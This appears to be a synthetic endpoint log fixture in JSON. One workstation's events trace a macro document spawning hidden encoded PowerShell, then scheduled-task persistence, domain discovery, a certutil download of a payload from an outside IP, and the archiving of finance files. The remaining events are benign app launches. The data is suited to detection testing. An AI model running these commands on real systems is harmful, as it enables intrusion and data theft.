@@ -1,0 +1,652 @@
+[
+  {
+    "timestamp": "2026-08-15T03:48:05Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "winword.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "winword.exe /n \\\\shared\\invoices\\Factura_0815.docm",
+    "hash_sha256": "b1a9c3e7f2d4a6b8c0e1f3a5b7c9d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8a0b1c3"
+  },
+  {
+    "timestamp": "2026-08-15T03:48:22Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "powershell.exe",
+    "parent_process": "winword.exe",
+    "command_line": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+    "hash_sha256": "d4e6f8a0b1c3b1a9c3e7f2d4a6b8c0e1f3a5b7c9d0e2f4a6b8c0d2e4f6a8b0c"
+  },
+  {
+    "timestamp": "2026-08-15T03:49:10Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "schtasks.exe",
+    "parent_process": "powershell.exe",
+    "command_line": "schtasks.exe /create /tn \"OneDriveSyncHelper\" /tr \"powershell.exe -nop -w hidden -enc SQBFAFgA...\" /sc onlogon /rl highest",
+    "hash_sha256": "aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd4"
+  },
+  {
+    "timestamp": "2026-08-15T03:51:00Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "whoami.exe",
+    "parent_process": "powershell.exe",
+    "command_line": "whoami /all",
+    "hash_sha256": "disc00bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44"
+  },
+  {
+    "timestamp": "2026-08-15T03:51:20Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "net.exe",
+    "parent_process": "powershell.exe",
+    "command_line": "net user /domain",
+    "hash_sha256": "disc01bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44"
+  },
+  {
+    "timestamp": "2026-08-15T03:51:40Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "nltest.exe",
+    "parent_process": "powershell.exe",
+    "command_line": "nltest /dclist:acmefintech.local",
+    "hash_sha256": "disc02bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44"
+  },
+  {
+    "timestamp": "2026-08-15T03:51:60Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "ipconfig.exe",
+    "parent_process": "powershell.exe",
+    "command_line": "ipconfig /all",
+    "hash_sha256": "disc03bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44"
+  },
+  {
+    "timestamp": "2026-08-15T04:05:18Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "certutil.exe",
+    "parent_process": "powershell.exe",
+    "command_line": "certutil.exe -urlcache -split -f http://194.36.191.55/upd.dat C:\\Users\\fmartinez\\AppData\\Local\\Temp\\upd.dat",
+    "hash_sha256": "cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff6"
+  },
+  {
+    "timestamp": "2026-08-15T04:05:42Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "upd.dat.exe",
+    "parent_process": "cmd.exe",
+    "command_line": "C:\\Users\\fmartinez\\AppData\\Local\\Temp\\upd.dat.exe -silent",
+    "hash_sha256": "ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb2"
+  },
+  {
+    "timestamp": "2026-08-15T05:30:11Z",
+    "host": "WKS-FMARTINEZ-01",
+    "user": "fmartinez",
+    "event_type": "process_create",
+    "process_name": "7z.exe",
+    "parent_process": "upd.dat.exe",
+    "command_line": "7z.exe a -p***REDACTED*** C:\\Users\\fmartinez\\AppData\\Local\\Temp\\bkp_0815.7z \"C:\\Users\\fmartinez\\Documents\\Finanzas\\*\"",
+    "hash_sha256": "ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc3"
+  },
+  {
+    "timestamp": "2026-08-15T09:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b809aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T09:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b809aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T09:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b809aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T09:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b809aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T09:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b809aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T10:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b810aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T10:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b810aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T10:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b810aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T10:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b810aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T10:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b810aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T11:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b811aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T11:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b811aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T11:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b811aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T11:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b811aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T11:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b811aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T12:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b812aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T12:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b812aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T12:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b812aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T12:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b812aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T12:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b812aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T13:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b813aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T13:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b813aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T13:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b813aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T13:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b813aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T13:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b813aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T14:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b814aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T14:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b814aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T14:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b814aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T14:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b814aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T14:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b814aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T15:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b815aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T15:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b815aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T15:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b815aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T15:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b815aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T15:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b815aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T16:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b816aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T16:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b816aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T16:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b816aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T16:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b816aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T16:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b816aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T17:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b817aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T17:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b817aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T17:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b817aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T17:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b817aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T17:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b817aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T18:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b818aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T18:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b818aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T18:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b818aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T18:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b818aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T18:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b818aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T19:02:00Z",
+    "host": "WKS-JRODRIGUEZ-01",
+    "user": "jrodriguez",
+    "event_type": "process_create",
+    "process_name": "outlook.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "outlook.exe",
+    "hash_sha256": "benign00f7a3c9d1e2b819aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T19:13:00Z",
+    "host": "WKS-LGOMEZ-01",
+    "user": "lgomez",
+    "event_type": "process_create",
+    "process_name": "teams.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "teams.exe",
+    "hash_sha256": "benign01f7a3c9d1e2b819aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T19:24:00Z",
+    "host": "WKS-KBRENNER-01",
+    "user": "kbrenner",
+    "event_type": "process_create",
+    "process_name": "chrome.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "chrome.exe",
+    "hash_sha256": "benign02f7a3c9d1e2b819aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T19:35:00Z",
+    "host": "WKS-SVC-BACKUP-01",
+    "user": "svc-backup",
+    "event_type": "process_create",
+    "process_name": "excel.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "excel.exe",
+    "hash_sha256": "benign03f7a3c9d1e2b819aa11bb22cc33dd44ee55ff66"
+  },
+  {
+    "timestamp": "2026-08-15T19:46:00Z",
+    "host": "WKS-MNUNEZ-01",
+    "user": "mnunez",
+    "event_type": "process_create",
+    "process_name": "slack.exe",
+    "parent_process": "explorer.exe",
+    "command_line": "slack.exe",
+    "hash_sha256": "benign04f7a3c9d1e2b819aa11bb22cc33dd44ee55ff66"
+  }
+]
